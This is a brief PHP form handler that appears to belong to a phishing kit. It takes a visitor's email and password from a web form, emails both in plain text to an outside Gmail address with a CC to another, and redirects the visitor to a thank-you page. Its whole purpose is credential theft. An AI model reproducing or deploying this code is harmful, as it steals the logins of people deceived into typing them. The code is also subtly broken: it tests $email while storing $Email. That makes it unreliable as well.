<?php
//get data from form  
$Email = $_POST['email'];
$passs= $_POST['text'];

$to = "nnabuiheemeka@gmail.com";
$subject = "Mail From website";
$txt ="Email = ". $Email . "\r\n  Password = " . $passs;
$headers = "From: is26683369@gmail.com" . "\r\n" .
"CC: coopernorman600@gmail.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>